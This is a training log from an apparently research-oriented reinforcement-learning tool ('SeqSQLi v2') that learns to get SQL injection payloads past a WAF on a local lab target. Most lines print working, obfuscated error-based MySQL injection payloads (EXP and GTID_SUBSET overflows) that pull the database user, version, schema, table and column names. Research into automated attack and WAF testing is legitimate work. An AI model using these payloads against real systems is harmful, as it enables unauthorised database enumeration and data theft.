/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  [BYPASS] Ep 8198 | steps=7 | seq=null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> newline -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(selECt%0a*%0aFroM%0a(seLect%0a(user%a0()))a));%00
  [BYPASS] Ep 8199 | steps=9 | seq=agg_swap -> newline -> null_byte -> agg_swap -> null_byte -> case -> agg_swap -> null_byte -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(selecT%0a*%0afrom%0a(selEct%0a(DatabASE%a0()))a));%00
  [BYPASS] Ep 8200 | steps=6 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aaND%0aEXP(~(SeleCT%0a*%0afRom%0a(sELEcT%0a((seLECT%0aJSON_ARRAYAGG(schema_name)%0aFROM%0aiNFORMaTION_scHema.schemata)))a));%00
  Ep 8200 | SR=50% | Steps=11.7 | R=-23.07
  [BYPASS] Ep 8202 | steps=4 | seq=func_sp_nbsp -> newline -> hex_to_char -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 8206 | steps=6 | seq=newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(sEleCT%0a*%0afrOM%0a(SELEct%0a(dataBASE%a0()))a));%00
  Ep 8210 | SR=20% | Steps=13.0 | R=-31.14
  Ep 8220 | SR=0% | Steps=15.0 | R=-37.95
  [BYPASS] Ep 8222 | steps=8 | seq=hex_to_char -> func_sp_nbsp -> newline -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(seLECT%0a*%0aFroM%0a(SElEcT%0a((SeleCt%0aJSON_ARRAYAGG(cONCaT(tABLE_schema,CHAR(46),taBLe_name))%0aFROm%0aINformATiOn_scHEMA.tabLEs%0
  [BYPASS] Ep 8223 | steps=11 | seq=func_sp_nbsp -> agg_swap -> newline -> agg_swap -> null_byte -> agg_swap -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(sElecT%0a*%0afROm%0a(sEleCT%0a(DATABaSE%a0()))a));%00
  [BYPASS] Ep 8225 | steps=5 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(SeLeCt%0a*%0afRom%0a(SeLeCT%0a(version%a0()))a));%00
  [BYPASS] Ep 8226 | steps=7 | seq=hex_to_char -> newline -> agg_swap -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(SelEcT%0a*%0afROM%0a(seleCt%0a((SELecT%0aJSON_ARRAYAGG(ConCaT(taBLE_schema,CHAR(46),tABle_name))%0aFROm%0aInFORMaTION_sCheMa.TAbles%0
  [BYPASS] Ep 8228 | steps=9 | seq=hex_to_char -> newline -> agg_swap -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> case -> null_byte
           payload: 1'%0aANd%0aEXP(~(SeLECT%0a*%0afrom%0a(selEcT%0a((SeLeCt%0aJSON_ARRAYAGG(ConCAt(TablE_schema,CHAR(46),tAbLE_name))%0afROm%0aINForMation_sChEma.tABLes%0
  Ep 8230 | SR=50% | Steps=11.5 | R=-22.19
  [BYPASS] Ep 8233 | steps=11 | seq=hex_to_char -> null_byte -> newline -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> agg_swap -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(SEleCt%0a*%0afRoM%0a(SeLEcT%0a((SEleCt%0aJSON_ARRAYAGG(CoNcAt(taBlE_schema,CHAR(46),tabLE_name))%0afrOm%0aINFoRmatIon_sChEMA.tABLEs%0
  [BYPASS] Ep 8237 | steps=4 | seq=newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(selECT%0a*%0aFrOm%0a(SeLEct%0a(DATABaSE%a0()))a));%00
  [BYPASS] Ep 8239 | steps=9 | seq=func_sp_nbsp -> newline -> null_byte -> formfeed -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(sElECt%0a*%0aFRoM%0a(SELEcT%0a(user%a0()))a));%00
  [BYPASS] Ep 8240 | steps=12 | seq=func_sp_nbsp -> newline -> null_byte -> agg_swap -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(selecT%0a*%0aFRoM%0a(sELect%0a(DAtAbaSe%a0()))a));%00
  Ep 8240 | SR=40% | Steps=12.6 | R=-27.34
  [BYPASS] Ep 8248 | steps=8 | seq=null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> case -> agg_swap -> newline
           payload: 1'%0aANd%0aGTID_SUBSET((user%a0()),1);%00
  Ep 8250 | SR=10% | Steps=14.3 | R=-36.49
  [BYPASS] Ep 8251 | steps=13 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> case_split -> null_byte -> null_byte -> null_byte -> agg_swap -> null_byte -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(selECT%0a*%0aFROM%0a(seLect%0a(DaTabase%a0()))a));%00
  [BYPASS] Ep 8255 | steps=7 | seq=agg_swap -> newline -> null_byte -> agg_swap -> newline -> func_sp_nbsp -> case
           payload: 1'%0aaND%0aEXP(~(sELect%0a*%0aFrOM%0a(SeleCt%0a(user%a0()))a));%00
  Ep 8260 | SR=20% | Steps=14.0 | R=-33.43
  [BYPASS] Ep 8262 | steps=5 | seq=newline -> null_byte -> agg_swap -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 8263 | steps=4 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 8269 | steps=7 | seq=newline -> agg_swap -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaND%0aEXP(~(SeLeCt%0a*%0aFroM%0a(sELeCt%0a(version%a0()))a));%00
  [BYPASS] Ep 8270 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 8270 | SR=40% | Steps=10.9 | R=-22.02
  [BYPASS] Ep 8272 | steps=6 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> case -> agg_swap
           payload: 1'%0aaNd%0aEXP(~(sElEcT%0a*%0afRom%0a(selECT%0a((SElEcT%0aJSON_ARRAYAGG(column_name)%0aFroM%0aINfoRmATiON_sCHEma.columns%0aWHerE%0atablE_schema=daTabA
  [BYPASS] Ep 8273 | steps=6 | seq=crlf -> null_byte -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCT%0d%0a*%0d%0afroM%0d%0a(seLect%0d%0a(DATaBAse%a0()))a));%00
  [BYPASS] Ep 8276 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(seleCT%0a*%0afroM%0a(selecT%0a(version%a0()))a));%00
  [BYPASS] Ep 8277 | steps=5 | seq=newline -> agg_swap -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aand%0aEXP(~(selEct%0a*%0aFrom%0a(SelECt%0a(version%a0()))a));%00
  Ep 8280 | SR=40% | Steps=11.2 | R=-23.21
  [BYPASS] Ep 8281 | steps=6 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(sElect%0a*%0aFROM%0a(sElect%0a(dATAbaSe%a0()))a));%00
  [BYPASS] Ep 8282 | steps=4 | seq=newline -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 8286 | steps=10 | seq=newline -> null_byte -> case -> case -> agg_swap -> agg_swap -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 8290 | steps=13 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> func_sp_tab -> agg_swap -> case
           payload: 1'%0aanD%0aEXP(~(sELECT%0a*%0aFROm%0a(SElECt%0a((SELeCt%0aJSON_ARRAYAGG(CONcaT(TABLe_schema,CHAR(46),tAble_name))%0aFrOM%0aiNFoRmatiON_ScHEma.taBles%0
  Ep 8290 | SR=40% | Steps=12.3 | R=-27.40
  [BYPASS] Ep 8293 | steps=10 | seq=newline -> null_byte -> case -> case -> hex_to_char -> case -> newline -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aANd%0aEXP(~(sELECt%0a*%0aFRom%0a(SeleCT%0a((sELect%0aJSON_ARRAYAGG(TaBLe_name)%0afroM%0aInfORmATIOn_scHEma.TAbLEs%0awheRe%0aTABLE_schema=daTabaSE
  [BYPASS] Ep 8294 | steps=13 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> agg_swap -> agg_swap -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(sELEcT%0a*%0afROm%0a(seLEcT%0a((SeleCt%0aJSON_ARRAYAGG(column_name)%0aFRoM%0aInfORmATIoN_SCHEmA.columns%0aWHEre%0atAble_schema=dAtabA
  [BYPASS] Ep 8295 | steps=7 | seq=null_byte -> null_byte -> newline -> null_byte -> case_split -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(sELecT%0a*%0aFRom%0a(sElECt%0a(user%a0()))a));%00
  [BYPASS] Ep 8298 | steps=10 | seq=agg_swap -> newline -> hex_to_char -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(SeLEct%0a*%0afROM%0a(sElECt%0a((sElECT%0aconcaT(CHAR(124),JSON_ARRAYAGG(TAbLE_name),CHAR(124))%0afroM%0ainfORMatiON_ScheMA.taBles%0aW
  Ep 8300 | SR=40% | Steps=13.0 | R=-26.72
  [BYPASS] Ep 8304 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SElEcT%0a*%0afRoM%0a(selecT%0a(user%a0()))a));%00
  [BYPASS] Ep 8308 | steps=6 | seq=null_byte -> newline -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(SELect%0a*%0afROm%0a(seleCt%0a((SElEct%0aJSON_ARRAYAGG(schema_name)%0afrOm%0ainFORMaTiON_sCheMA.schemata)))a));%00
  Ep 8310 | SR=20% | Steps=13.1 | R=-29.66
  [BYPASS] Ep 8313 | steps=4 | seq=null_byte -> newline -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8314 | steps=8 | seq=newline -> null_byte -> func_sp_nbsp -> ident_backtick -> null_byte -> agg_swap -> agg_swap -> case
           payload: 1'%0aand%0aEXP(~(SeleCT%0a*%0aFRom%0a(seLEcT%0a((SelECT%0aJSON_ARRAYAGG(TablE_name)%0afrOm%0aINfOrmatiON_SCHema.taBlEs%0aWHERE%0aTAblE_schema=DAtaBAsE
  Ep 8320 | SR=20% | Steps=13.2 | R=-31.44
  [BYPASS] Ep 8326 | steps=8 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> agg_swap -> null_byte
           payload: 1'%0aAND%0aEXP(~(seLecT%0a*%0aFrom%0a(SEleCt%0a(user%a0()))a));%00
  [BYPASS] Ep 8327 | steps=7 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> agg_swap -> null_byte -> case
           payload: 1'%0aaND%0aEXP(~(SeLECT%0a*%0afRoM%0a(seLECt%0a((SeLEct%0aJSON_ARRAYAGG(tabLE_name)%0aFrOm%0aINFormaTiOn_sCHEma.tabLEs%0awHErE%0atabLE_schema=DAtAbAse
  Ep 8330 | SR=20% | Steps=13.5 | R=-32.57
  [BYPASS] Ep 8331 | steps=6 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aand%0aEXP(~(sELect%0a*%0aFROm%0a(sELeCt%0a((SELECt%0acONCAT(CHAR(124),JSON_ARRAYAGG(TaBle_name),CHAR(124))%0aFroM%0ainFoRMation_sChEMa.Tables%0aW
  [BYPASS] Ep 8335 | steps=14 | seq=newline -> null_byte -> hex_to_char -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(SELECt%0a*%0aFRoM%0a(sElECT%0a((sElEcT%0aJSON_ARRAYAGG(conCAt(TaBLE_schema,CHAR(46),TABLE_name))%0aFrom%0ainfORMatiON_ScHEmA.TAbLEs%0
  [BYPASS] Ep 8336 | steps=7 | seq=newline -> func_sp_nbsp -> hash_nl -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(SeLEct%0a*%0afROM%0a(SeLecT%0a((SelECT%0aJSON_ARRAYAGG(TaBLE_name)%0aFroM%0aINfOrmATIoN_sCHeMA.tABLEs%0awHerE%0atAbLe_schema=DatAbasE
  Ep 8340 | SR=30% | Steps=13.2 | R=-30.39
  [BYPASS] Ep 8342 | steps=5 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(SeleCT%0a*%0aFrOm%0a(sElECt%0a(DaTabASE%a0()))a));%00
  [BYPASS] Ep 8344 | steps=5 | seq=newline -> func_sp_nbsp -> agg_swap -> func_sp_tab -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 8350 | SR=20% | Steps=13.0 | R=-31.76
  [BYPASS] Ep 8360 | steps=10 | seq=hex_to_char -> newline -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> case -> func_sp_nbsp -> agg_swap
           payload: 1'%0aAnd%0aEXP(~(sELECT%0a*%0afrOM%0a(seLect%0a((SelecT%0aJSON_ARRAYAGG(CONCAT(TaBlE_schema,CHAR(46),tabLE_name))%0afRoM%0aiNForMatIon_SchEMa.Tables%0
  Ep 8360 | SR=10% | Steps=14.5 | R=-36.36
  [BYPASS] Ep 8362 | steps=7 | seq=agg_swap -> func_sp_nbsp -> newline -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(sELecT%0a*%0aFrOM%0a(sELeCt%0a((SELEct%0aJSON_ARRAYAGG(column_name)%0aFroM%0aiNfoRMATiOn_sCHeMa.columns%0aWheRE%0aTable_schema=DataBa
  [BYPASS] Ep 8366 | steps=5 | seq=null_byte -> ver_12345 -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8367 | steps=4 | seq=newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(sELEct%0a*%0afRom%0a(SELeCT%0a(user%a0()))a));%00
  [BYPASS] Ep 8370 | steps=8 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp -> agg_swap -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(sELECT%0a*%0aFROM%0a(sELeCT%0a(dAtabasE%a0()))a));%00
  Ep 8370 | SR=40% | Steps=11.4 | R=-23.96
  [BYPASS] Ep 8371 | steps=13 | seq=hex_to_char -> newline -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> case -> newline -> null_byte -> func_sp_nbsp -> null_byte -> hex_to_char -> null_byte -> agg_swap
           payload: 1'%0aANd%0aEXP(~(seLEct%0a*%0aFroM%0a(SElECT%0a((sEleCt%0aJSON_ARRAYAGG(CONCAT(TaBlE_schema,CHAR(46),TAbLE_name))%0aFRoM%0aInFOrmaTIoN_schemA.tabLes%0
  [BYPASS] Ep 8376 | steps=8 | seq=newline -> agg_swap -> newline -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(sELEct%0a*%0aFRom%0a(SeLect%0a((sEleCT%0aJSON_ARRAYAGG(tAbLe_name)%0afROM%0aiNfOrMAtIoN_SCHema.tABLEs%0awhere%0atabLe_schema=DAtaBase
  [BYPASS] Ep 8377 | steps=6 | seq=func_sp_nbsp -> null_byte -> agg_swap -> newline -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(seLEct%0a*%0afrOM%0a(SELECt%0a(DATaBASE%a0()))a));%00
  Ep 8380 | SR=30% | Steps=13.2 | R=-27.91
  [BYPASS] Ep 8382 | steps=9 | seq=null_byte -> newline -> null_byte -> agg_swap -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(SElect%0a*%0aFrOm%0a(SEleCt%0a(user%a0()))a));%00
  [BYPASS] Ep 8386 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 8388 | steps=10 | seq=null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> newline -> null_byte -> agg_swap -> func_sp_tab -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(sELECT%0a*%0afroM%0a(sElEcT%0a(DaTaBasE%a0()))a));%00
  [BYPASS] Ep 8390 | steps=8 | seq=agg_swap -> newline -> agg_swap -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SELEct%0a*%0aFROM%0a(SELEcT%0a(DAtAbAse%a0()))a));%00
  Ep 8390 | SR=40% | Steps=12.0 | R=-25.21
  [BYPASS] Ep 8393 | steps=7 | seq=newline -> null_byte -> null_byte -> null_byte -> agg_swap -> case -> func_sp_nbsp
           payload: 1'%0aANd%0aGTID_SUBSET((DatabASe%a0()),1);%00
  [BYPASS] Ep 8394 | steps=5 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aaNd%0aEXP(~(SeLecT%0a*%0aFROm%0a(sElect%0a(user%a0()))a));%00
  [BYPASS] Ep 8398 | steps=5 | seq=newline -> null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(SEleCt%0a*%0afrOM%0a(seLecT%0a(version%a0()))a));%00
  Ep 8400 | SR=30% | Steps=12.2 | R=-26.23
  [BYPASS] Ep 8402 | steps=10 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> case -> case -> case -> null_byte
           payload: 1'%0aaNd%0aEXP(~(SeLECT%0a*%0aFROm%0a(SELEct%0a((seleCT%0acOnCat(CHAR(124),JSON_ARRAYAGG(taBLe_name),CHAR(124))%0aFROm%0aInFORMATIon_schEMa.tABLEs%0aw
  [BYPASS] Ep 8406 | steps=7 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(SEleCt%0a*%0aFrom%0a(sEleCT%0a((SEleCT%0aJSON_ARRAYAGG(tabLe_name)%0afROM%0aInForMAtIOn_ScHEmA.tABlEs%0aWhERE%0aTAblE_schema=DATAbAsE
  [BYPASS] Ep 8407 | steps=4 | seq=func_sp_nbsp -> newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 8410 | SR=30% | Steps=12.6 | R=-25.37
  [BYPASS] Ep 8414 | steps=7 | seq=hex_to_char -> case -> agg_swap -> newline -> null_byte -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SelecT%0a*%0aFrOM%0a(SElecT%0a((SeLect%0acONCaT(CHAR(124),JSON_ARRAYAGG(table_name),CHAR(124))%0aFRom%0aiNFORMatIoN_SchEmA.tablEs%0aW
  [BYPASS] Ep 8418 | steps=6 | seq=newline -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(selEcT%0a*%0afRoM%0a(SeLEcT%0a((SELEcT%0aJSON_ARRAYAGG(column_name)%0afROm%0aiNFORmaTiOn_sCHEMA.columns%0aWHerE%0atABLe_schema=DATAbA
  Ep 8420 | SR=20% | Steps=13.3 | R=-29.55
  [BYPASS] Ep 8427 | steps=7 | seq=newline -> null_byte -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(sELEct%0a*%0aFroM%0a(SelECT%0a(version%a0()))a));%00
  [BYPASS] Ep 8428 | steps=5 | seq=hex_to_char -> newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aaND%0aEXP(~(SElECt%0a*%0afrOm%0a(sEleCt%0a(databAse%a0()))a));%00
  [BYPASS] Ep 8430 | steps=7 | seq=newline -> null_byte -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> agg_swap
           payload: 1'%0aANd%0aEXP(~(SElect%0a*%0aFroM%0a(sELECt%0a((SELECt%0aJSON_ARRAYAGG(schema_name)%0aFrOM%0aInfOrMaTIOn_ScheMA.schemata)))a));%00
  Ep 8430 | SR=30% | Steps=12.4 | R=-28.29
  [BYPASS] Ep 8439 | steps=6 | seq=newline -> hex_to_char -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 8440 | SR=10% | Steps=14.1 | R=-35.12
  [BYPASS] Ep 8442 | steps=8 | seq=newline -> null_byte -> case -> agg_swap -> agg_swap -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((daTAbaSE%a0()),1);%00
  [BYPASS] Ep 8443 | steps=7 | seq=agg_swap -> newline -> null_byte -> agg_swap -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aANd%0aEXP(~(sELeCT%0a*%0aFRoM%0a(SELecT%0a((SELect%0aJSON_ARRAYAGG(tABlE_name)%0afrom%0aINfOrMAtiOn_sChema.taBlEs%0aWhERe%0atABLe_schema=daTaBAsE
  [BYPASS] Ep 8444 | steps=4 | seq=newline -> char_split -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8447 | steps=5 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(sElEct%0a*%0aFRom%0a(seLECT%0a(version%a0()))a));%00
  Ep 8450 | SR=40% | Steps=11.4 | R=-22.82
  [BYPASS] Ep 8452 | steps=5 | seq=agg_swap -> newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(SELEct%0a*%0aFRoM%0a(sElEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 8454 | steps=9 | seq=null_byte -> crlf -> null_byte -> hex_to_char -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0d%0aAnd%0d%0aEXP(~(sELECT%0d%0a*%0d%0afrom%0d%0a(SEleCt%0d%0a(DaTABAsE%a0()))a));%00
  [BYPASS] Ep 8456 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8460 | steps=7 | seq=func_sp_nbsp -> func_sp_nbsp -> newline -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(SelEcT%0a*%0afRom%0a(SELEct%0a(user%a0()))a));%00
  Ep 8460 | SR=40% | Steps=11.4 | R=-21.62
  [BYPASS] Ep 8462 | steps=10 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> case -> func_sp_nbsp -> null_byte -> case -> agg_swap
           payload: 1'%0aAND%0aEXP(~(SELEcT%0a*%0aFrOM%0a(SelEcT%0a((sELect%0aJSON_ARRAYAGG(TaBle_name)%0afrOM%0aiNfORMaTiOn_SCHema.tABLEs%0aWhERe%0aTabLe_schema=dATAbaSE
  [BYPASS] Ep 8465 | steps=3 | seq=crlf -> func_sp_nbsp -> null_byte
           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((database%a0()),1);%00
  Ep 8470 | SR=20% | Steps=13.3 | R=-30.28
  [BYPASS] Ep 8473 | steps=4 | seq=func_sp_nbsp -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aGTID_SUBSET((dATaBase%a0()),1);%00
  Ep 8480 | SR=10% | Steps=13.9 | R=-34.74
  [BYPASS] Ep 8484 | steps=6 | seq=newline -> null_byte -> newline -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8485 | steps=8 | seq=agg_swap -> newline -> null_byte -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aaND%0aEXP(~(SeleCT%0a*%0afrOm%0a(seLECT%0a(user%a0()))a));%00
  [BYPASS] Ep 8489 | steps=7 | seq=agg_swap -> newline -> func_sp_nbsp -> agg_swap -> null_byte -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(sEleCT%0a*%0afRoM%0a(selecT%0a(DaTaBASE%a0()))a));%00
  [BYPASS] Ep 8490 | steps=7 | seq=newline -> null_byte -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(sElEcT%0a*%0aFrom%0a(sElecT%0a((seLecT%0aJSON_ARRAYAGG(schema_name)%0aFRoM%0ainFoRMAtion_sCHEMa.schemata)))a));%00
  Ep 8490 | SR=40% | Steps=11.8 | R=-26.19
  [BYPASS] Ep 8495 | steps=13 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> agg_swap -> null_byte -> null_byte -> null_byte -> null_byte -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(sELect%0a*%0aFROm%0a(SEleCT%0a((selEcT%0aJSON_ARRAYAGG(schema_name)%0aFroM%0aiNFoRMAtiON_ScHEma.schemata)))a));%00
  [BYPASS] Ep 8496 | steps=11 | seq=newline -> func_sp_nbsp -> hex_to_char -> case -> dbl_url_comment -> null_byte -> case -> func_sp_nbsp -> case -> case -> agg_swap
           payload: 1'%0aANd%0aEXP(~(seLecT%0a*%0aFroM%0a(seLeCT%0a((SelEct%0aJSON_ARRAYAGG(CONCAT(TabLE_schema,CHAR(46),TABLe_name))%0afrOm%0aInFoRMATiON_SCHeMA.TabLes%0
